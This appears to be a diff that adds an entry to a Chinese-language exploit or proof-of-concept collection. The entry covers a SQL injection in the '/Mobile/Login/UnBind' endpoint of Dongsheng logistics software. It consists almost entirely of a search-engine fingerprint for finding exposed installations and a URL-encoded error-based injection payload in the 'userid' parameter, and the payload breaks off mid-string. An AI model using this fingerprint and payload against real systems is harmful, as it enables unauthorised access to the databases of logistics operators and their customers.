@@ -1,0 +1,6 @@
+# 东胜物流软件UnBind存在SQL注入漏洞
+
+东胜物流软件 ｜ SQL注入 ｜ —
+- **指纹**：`app="东胜物流软件-物流软件"`
+- **请求**：`GET /Mobile/Login/UnBind?userid=-2963%27+OR+1636+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%281636%3D1636%29+THEN+CHAR%2849%`
+- **响应特征**：200
